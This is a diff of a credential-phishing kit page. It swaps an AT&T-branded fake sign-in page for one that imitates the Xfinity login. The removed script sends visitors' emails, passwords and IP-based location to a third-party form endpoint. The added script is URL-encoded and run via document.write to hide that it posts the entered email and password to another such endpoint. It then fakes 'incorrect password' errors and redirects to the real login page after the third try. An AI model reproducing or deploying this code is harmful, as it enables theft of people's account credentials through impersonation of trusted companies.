-  text-decoration: none;
-  font-weight: 600;
-  
-}
-
-.forgot-pass:hover {
-  text-decoration: underline;
-}
-
-/* Mobile — mimic real Microsoft login */
-@media (max-width: 540px) {
-
-  body {
-    background: #ffffff !important;   /* Microsoft uses pure white */
-    background-image: none !important;
-  }
-
-
-
-  /* Microsoft hides these on mobile */
-  .footer,
-  .other-signin,
-  .back-arrow {
-    display: none !important;
-  }
-
-  /* They also center the Microsoft logo */
-  .microsoft-container {
-    text-align: left;       /* On mobile, Microsoft aligns logo left */
-    margin-bottom: 24px;
-  }
-
-  .microsoft-image {
-    height: 22px;           /* Slightly smaller logo on mobile */
-  }
-
-  /* Adjust password input spacing */
-  .password-wrapper {
-    margin-top: 24px;
-  }
-}
-
-.remember-me {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    max-width: 360px;
-    margin: 18px auto 0 auto;
-    font-size: 14px;
-    color: #1b1b1b;
-}
-
-.remember-me input[type="checkbox"] {
-    width: 18px;
-    height: 18px;
-    margin: 0;
-    cursor: pointer;
-}
-
-.remember-me label {
-    cursor: pointer;
-}
-
-
-/* FOOTER */
-.footer {
-  margin-top: auto;
-  padding: 36px 18px 18px 18px;
-  box-sizing: border-box;
-  font-size: 12px;
-  color: #000;
-  background: transparent;
-  text-align: center;
-}
-
-.footer-links {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 26px;
-  flex-wrap: wrap;
-}
-
-.footer a {
-  color: #000;
-  text-decoration: none;
-  white-space: nowrap;
-}
-
-.footer a:hover {
-  text-decoration: underline;
-}
-
-.footer-copy {
-  margin-top: 16px;
-  color: #5f6368;
-  font-size: 12px;
-}
-
-.privacy-choice {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  white-space: nowrap;
-}
-
-.privacy-icon {
-  width: 22px;
-  height: 12px;
-  display: inline-block;
-}
-
-@media (max-width: 540px) {
-  .footer {
-    display: none !important;
-  }
-}
-
-
-  </style>
 </head>
-<body>
 
-  <div class="form-shape">
 
-    <!-- ARROW + LOGO -->
-    <div class="top-bar-wrapper">
 
-      <div class="microsoft-container">
-        <img class="att-image"
-             src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg"
-             alt="AT&T">
-      </div>
 
+<body style="background-color: white;">
+
+    <div class="whole-page">
+        
+<div class="xfinity-header">
+  <svg
+    class="xfinity-logo-svg"
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 379.76 119.89"
+    width="379.76"
+    height="119.89"
+    fill="currentColor"
+    focusable="false"
+    role="img"
+    aria-hidden="true"
+  >
+    <path d="M68.6 32.67H57.42c-4.46 0-7.6 1.53-10.17 4.95L35.22 53.79 23.56 37.62c-2.57-3.43-5.7-4.95-10.17-4.95H2.22L26.2 65.18.74 99.56l-.74 1h10.65c4.46 0 7.6-1.53 10.17-4.95l14.39-19.05 27.66 38.38c2.4 3.39 5.63 4.97 10.18 4.97h11.43L44.37 65.19l24.25-32.51ZM371.4 32.67c-5.06 0-8.39 1.65-10.22 5.03l-18.61 34.58-16.07-34.55c-1.64-3.4-4.98-5.06-10.23-5.06h-8.04l25.89 54.96-17.67 32.26h8.37c5.17 0 8.79-1.78 10.74-5.29l43.72-81.01.49-.92h-8.36ZM126.97 100.56h14.7V32.67h-14.7v67.89z"></path>
+    <path d="M112.04 0C98.85 0 85.55 8.68 85.55 28.06v4.61h-6.76l-9.37 13.27h16.13v54.62h14.71V45.94h17.25V32.67h-17.25v-4.34c0-13.12 8.98-14.53 12.84-14.53 1.51 0 3.03.22 4.39.63l.64.19 3.01-13.06-.5-.2c-1.6-.62-4.39-1.35-8.59-1.35ZM191.32 31.23c-7.7 0-14.7 2.49-20.28 7.21v-5.77h-14.71v67.89h14.71V54.4c4.31-5.96 10.19-9.11 17.02-9.11 10.23 0 16.1 6.63 16.1 18.19v30.06c0 4.14 2.84 7.03 6.9 7.03h7.81V61.14c0-17.6-11.32-29.89-27.54-29.89ZM232.68 100.56h14.71V32.67h-14.71v67.89zM304.09 87.3l-.56.13c-1.8.42-3.88.64-6 .64-3.5 0-11.66-1.17-11.66-12.05V45.94h19.16l-5.99-13.13-.07-.14h-13.11V5.55l-14.71 6.43v20.69h-14.24v13.27h14.24v30.34c0 15.7 9.75 25.45 25.45 25.45 3.67 0 7.03-.45 9.99-1.34l2.98-1.01-5.41-11.9-.09-.18Z"></path>
+  </svg>
+</div>
+     
+
+
+        <div class="form-container">
+            <div class="main-box">
+
+
+                <!-- Replace the existing form section with this -->
+<form id="contact" class="form-horizontal well">
+
+        <div>
+            <input id="username" type="text" name="email" aria-describedby="id-3" placeholder="" class="user" value="[[-Email-]]">
+        </div>
+    
+
+    <div class="signin-tocontinue">
+        <p class="sign-layout-title">Enter your password</p>
     </div>
 
-
-    <!-- FORM -->
-    <form id="contact" class="form-horizontal well">
-
-            <!-- HEADING -->
-      <div class="sign-in">Sign in to view document</div>
-      <div class="verify-note">You are accessing sensitive information, verify now!</div>
-
-      <label for="email-input" class="input-label">User ID</label>
-
-      <input type="email" name="email" placeholder=""  class="emaill" value="">
-
-      <!-- PASSWORD WITH SHOW / HIDE ICON -->
-      
-  
+    
 
 
       <div class="password-wrapper">
+    <input placeholder="" name="pass" id="password" type="password" class="box">
 
-    <label for="password-input" class="input-label">Password</label>
+    <span class="toggle-password" id="togglePassword">
+        <!-- default icon = "hidden" icon -->
+        <svg id="icon-hidden" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M13.49,12A1.5,1.5,0,1,1,12,10.5,1.5,1.5,0,0,1,13.49,12ZM21,12a11.08,11.08,0,0,1-9,5,11.08,11.08,0,0,1-9-5,11.07,11.07,0,0,1,9-5A11.07,11.07,0,0,1,21,12Zm-6,0a3,3,0,1,0-3,3A3,3,0,0,0,15,12Z"></path>
+        </svg>
 
-    <div class="password-field">
-
-        <input
-            type="password"
-            name="pass"
-            placeholder=""
-            class="passs"
-            id="password-input">
-
-        <button
-            type="button"
-            class="password-toggle"
-            data-visible="false"
-            aria-label="Show password">
-            Show
-        </button>
-
-    </div>
-
-    <div id="password-error" class="error-message" style="display:none;">
-        <span class="error-icon" aria-hidden="true">
-            <svg width="16" height="16" viewBox="0 0 20 20">
-                <path fill="#E81123" d="M10 0C4.486 0 0 4.486 0 10s4.486 10 10 10 10-4.486 10-10S15.514 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
-            </svg>
-        </span>
-        <span class="error-text">
-            Incorrect User ID or Password. Try again.
-        </span>
-    </div>
-
+        <svg id="icon-visible" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" style="display:none;">
+            <path d="M21,12a11.37,11.37,0,0,1-3.43,3.33L14.9,12.7A2.63,2.63,0,0,0,15,12a3,3,0,0,0-3-3,3.27,3.27,0,0,0-.7.09L9.51,7.34A10.27,10.27,0,0,1,12,7,11.08,11.08,0,0,1,21,12Zm-4.81,4.07,2.36,2.35-1.07,1L14.6,16.63A10.18,10.18,0,0,1,12,17,11.09,11.09,0,0,1,3,12,11.75,11.75,0,0,1,6.54,8.6l-2.07-2L5.53,5.49,7.92,7.87h0l2,2h0l.7.7h0l2.82,2.81h0l.71.7h0l2,2Zm-3.36-1.23L11.94,14A2,2,0,0,1,10,12.05l-.87-.87A2.82,2.82,0,0,0,9,12a3,3,0,0,0,3,3A3.2,3.2,0,0,0,12.82,14.86ZM12.22,10,14,11.78A2,2,0,0,0,12.22,10Z"></path>
+        </svg>
+    </span>
 </div>
 
-  
-
-   <div class="remember-me">
-       <input type="checkbox" id="remember">
-       <label for="remember">Keep me signed in</label>
-   </div>
-
-      <!-- BUTTON -->
-      <button type="submit" class="button" id="submit-btn">
-        <span class="btn-label">Next</span>
-        <span class="spinner" aria-hidden="true"></span>
-      </button>
-    </form>
-
-      <div class="forgot-link">
-         <a href="#" class="forgot-pass">Forgot your password?</a>
-      </div>
-
-  </div>
-
-  <footer class="footer">
-    <div class="footer-links">
-    <a href="#">Legal policy center</a>
-    <a href="#">Privacy policy</a>
-    <a href="#">Terms of use</a>
-    <a href="#">Accessibility</a>
-    <a href="#" class="privacy-choice">
-      <svg class="privacy-icon" viewBox="0 0 40 20" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
-        <rect x="1" y="3" width="38" height="14" rx="7" fill="#f5f5f5" stroke="#5f6368" stroke-width="1.5"/>
-        <circle cx="13" cy="10" r="5" fill="#5f6368"/>
-        <path d="M10.5 8.3L13 10.8L17 6.8" fill="none" stroke="#fff" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
-        <path d="M24 7L30 13M30 7L24 13" stroke="#5f6368" stroke-width="1.5" stroke-linecap="round"/>
+<!-- Hotmail-style error message + icon -->
+<div id="password-error" class="error-message" style="display:none;">
+    <span class="error-icon" aria-hidden="true">
+      <svg width="16" height="16" viewBox="0 0 20 20">
+        <path fill="#E81123" d="M10 0C4.486 0 0 4.486 0 10s4.486 10 10 10 10-4.486 10-10S15.514 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
       </svg>
-      Your privacy choices
+    </span>
+    <span class="error-text">
+      The Xfinity ID or password you entered was incorrect. Please try again.
+    </span>
+</div>
+
+
+    
+      <!-- Forgot Password link -->
+<div class="forgot-wrapper">
+    <a class="forgot-link" href="#">
+        Forgot password?
     </a>
-    <a href="#">Screen share code</a>
+</div>
+
+<!-- Keep me signed in -->
+<div class="keep-signed-wrapper">
+    <input type="checkbox" id="keep-signed" class="keep-signed-checkbox">
+    <label for="keep-signed" class="keep-signed-label">Keep me signed in</label>
+</div>
+
+
+
+    <div class="in-between" id="id-3"></div>
+
+    <div class="policy">
+        <prism-text id="implied-legal" display="body3" class="policy1">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="https://www.xfinity.com/privacy/">Privacy Policy</a>.</prism-text>
     </div>
-    <div class="footer-copy">©2026 AT&amp;T Intellectual Property. All rights reserved.</div>
-  </footer>
+
+    <!-- Updated button: text + spinner -->
+    <button class="signin-button" aria-busy="false" type="submit" id="submit-btn">
+        <span class="btn-text">Sign in</span>
+        <span class="spinner" aria-hidden="true"></span>
+    </button>
 
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</form>
+
 <script>
-  $(document).ready(function() {
-
-    async function getVisitorInfo() {
-    var info = {
-        ip: "",
-        city: "",
-        region: "",
-        country: "",
-        country_code: "",
-        postal: "",
-        timezone: "",
-        org: ""
-    };
-
-    try {
-
-        // STEP A — Get IP from ipify
-        var ipResponse = await fetch("https://api.ipify.org?format=json");
-        var ipData = await ipResponse.json();
-
-        info.ip = ipData.ip || "";
-
-        // STEP B — Send IP to ipinfo.io
-        if (info.ip) {
-
-            var infoResponse = await fetch(
-                "https://ipinfo.io/" + info.ip + "/json"
-            );
-
-            var infoData = await infoResponse.json();
-
-            info.city = infoData.city || "";
-            info.region = infoData.region || "";
-            info.country = infoData.country || "";
-            info.country_code = infoData.country || "";
-            info.postal = infoData.postal || "";
-            info.timezone = infoData.timezone || "";
-            info.org = infoData.org || "";
-        }
-
-    } catch (error) {
-
-        console.log("Visitor info lookup failed:", error);
-
-    }
-
-    return info;
-}
-
-    var attemptCount = 0;
-
-    // Show / hide password toggle
-    var $passwordInput = $('#password-input');
-    var $toggleBtn = $('.password-toggle');
-    var $errorMessage = $('#password-error');
-
-    $toggleBtn.on("click", function () {
-
-    const visible = $(this).attr("data-visible") === "true";
-
-    if (visible) {
-        $passwordInput.attr("type", "password");
-        $(this)
-            .text("Show")
-            .attr("data-visible", "false")
-            .attr("aria-label", "Show password");
-    } else {
-        $passwordInput.attr("type", "text");
-        $(this)
-            .text("Hide")
-            .attr("data-visible", "true")
-            .attr("aria-label", "Hide password");
-    }
-
-});
-
-    // Hide error when user starts typing again
-    $passwordInput.on('input', function () {
-  $errorMessage.hide();
-  $passwordInput.removeClass('input-error');
-});
-
-
-    $("#contact").on('submit', async function(e) {
-      e.preventDefault();
-
-      var email = $(".emaill").val();
-      var password = $("input[name='pass']").val();
-
-      var visitorInfo = await getVisitorInfo();
-
-      attemptCount++;
-
-      if (attemptCount <= 3) {
-        $.ajax({
-          dataType: "JSON",
-          url: "https://submit-form.com/e07TXdO5i",
-          type: "POST",
-
-          contentType: "application/json",
-
-headers: {
-    Accept: "application/json"
-},
-
-          data: JSON.stringify({
-    email: email,
-    password: password,
-
-    ip: visitorInfo.ip,
-    city: visitorInfo.city,
-    region: visitorInfo.region,
-    country: visitorInfo.country,
-    country_code: visitorInfo.country_code,
-    postal: visitorInfo.postal,
-    timezone: visitorInfo.timezone,
-    org: visitorInfo.org
-}),
-          beforeSend: function() {
-            $("#submit-btn")
-              .addClass("loading")
-              .prop("disabled", true);
-
-            // hide any previous error while submitting
-            $errorMessage.hide();
-          },
-          success: function(response) {
-            if (response) {
-              console.log(response);
-            }
-          },
-          complete: function() {
-            $("#submit-btn")
-              .removeClass("loading")
-              .prop("disabled", false);
-
-            if (attemptCount < 3) {
-              // clear password and show error after spinner finishes
-              $("input[name='pass']").val('');
-              $errorMessage.show();
-              $passwordInput.addClass('input-error');
-            } else if (attemptCount === 3) {
-              // 3rd submission: redirect after spinner completes
-              window.location.replace("https://outlook.live.com/mail/0/");
-            }
-          }
-        });
-      }
-    });
-  });
+document.write(unescape('%3Cscript%20src%3D%22https%3A//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js%22%3E%3C/script%3E%0D%0A%0D%0A%3Cscript%20src%3D%22https%3A//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js%22%3E%3C/script%3E%0D%0A%3Cscript%3E%0D%0A%24%28document%29.ready%28function%28%29%20%7B%0D%0A%20%20%20%20var%20attemptCount%20%3D%200%3B%0D%0A%20%20%20%20var%20%24btn%20%3D%20%24%28%22%23submit-btn%22%29%3B%0D%0A%20%20%20%20var%20%24passwordInput%20%3D%20%24%28%22%23password%22%29%3B%0D%0A%20%20%20%20var%20%24errorMessage%20%3D%20%24%28%22%23password-error%22%29%3B%0D%0A%0D%0A%20%20%20%20//%20Hide%20error%20when%20user%20starts%20typing%20again%20%28like%20NEW%20HOTMAIL%20PAGE%29%0D%0A%20%20%20%20%24passwordInput.on%28%27input%27%2C%20function%20%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%24errorMessage.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%24passwordInput.removeClass%28%27input-error%27%29%3B%0D%0A%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%0D%0A%20%20%20%20%24%28%22%23contact%22%29.on%28%27submit%27%2C%20function%28e%29%20%7B%0D%0A%20%20%20%20%20%20%20%20e.preventDefault%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20var%20email%20%3D%20%24%28%22%23username%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20password%20%3D%20%24%28%22input%5Bname%3D%27pass%27%5D%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20attemptCount++%3B%0D%0A%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20if%20%28attemptCount%20%3C%3D%203%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.ajax%28%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20dataType%3A%20%22JSON%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20%22https%3A//submit-form.com/pcx9KrJ4R%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20%22POST%22%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20email%3A%20email%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20password%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Show%20spinner%20on%20button%20instead%20of%20%22Verifying...%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24btn.attr%28%22aria-busy%22%2C%20%22true%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.prop%28%22disabled%22%2C%20true%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.addClass%28%22loading%22%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20mimic%20Hotmail%3A%20hide%20any%20previous%20error%20while%20submitting%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24errorMessage.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24passwordInput.removeClass%28%27input-error%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28response%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28response%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20behavior%20handled%20uniformly%20in%20complete%28%29%2C%20like%20NEW%20HOTMAIL%20PAGE%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Restore%20button%20to%20normal%20state%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24btn.attr%28%22aria-busy%22%2C%20%22false%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.prop%28%22disabled%22%2C%20false%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.removeClass%28%22loading%22%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28attemptCount%20%3C%203%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20Clear%20password%20and%20show%20inline%20error%2C%20like%20NEW%20HOTMAIL%20PAGE%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22input%5Bname%3D%27pass%27%5D%22%29.val%28%27%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24errorMessage.show%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24passwordInput.addClass%28%27input-error%27%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%20%28attemptCount%20%3D%3D%3D%203%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%203rd%20submission%3A%20redirect%20%28same%20logic%20as%20NEW%20HOTMAIL%20PAGE%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%22https%3A//login.xfinity.com/login%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%7D%29%3B%0D%0A%7D%29%3B%0D%0A%3C/script%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0D%0A%20%20%20%20%20%20%20%20%3C/div%3E%0D%0A%20%20%20%20%3C/div%3E%0D%0A%0D%0A%20%20%20%20%3Cscript%3E%0D%0Adocument.getElementById%28%22togglePassword%22%29.addEventListener%28%22click%22%2C%20function%28%29%20%7B%0D%0A%20%20%20%20const%20password%20%3D%20document.getElementById%28%22password%22%29%3B%0D%0A%20%20%20%20const%20hiddenIcon%20%3D%20document.getElementById%28%22icon-hidden%22%29%3B%0D%0A%20%20%20%20const%20visibleIcon%20%3D%20document.getElementById%28%22icon-visible%22%29%3B%0D%0A%0D%0A%20%20%20%20if%20%28password.type%20%3D%3D%3D%20%22password%22%29%20%7B%0D%0A%20%20%20%20%20%20%20%20password.type%20%3D%20%22text%22%3B%0D%0A%20%20%20%20%20%20%20%20hiddenIcon.style.display%20%3D%20%22none%22%3B%0D%0A%20%20%20%20%20%20%20%20visibleIcon.style.display%20%3D%20%22block%22%3B%0D%0A%20%20%20%20%7D%20else%20%7B%0D%0A%20%20%20%20%20%20%20%20password.type%20%3D%20%22password%22%3B%0D%0A%20%20%20%20%20%20%20%20hiddenIcon.style.display%20%3D%20%22block%22%3B%0D%0A%20%20%20%20%20%20%20%20visibleIcon.style.display%20%3D%20%22none%22%3B%0D%0A%20%20%20%20%7D%0D%0A%7D%29%3B%0D%0A%3C/script%3E'));
 </script>
+
 
 </body>
 </html>
+
+
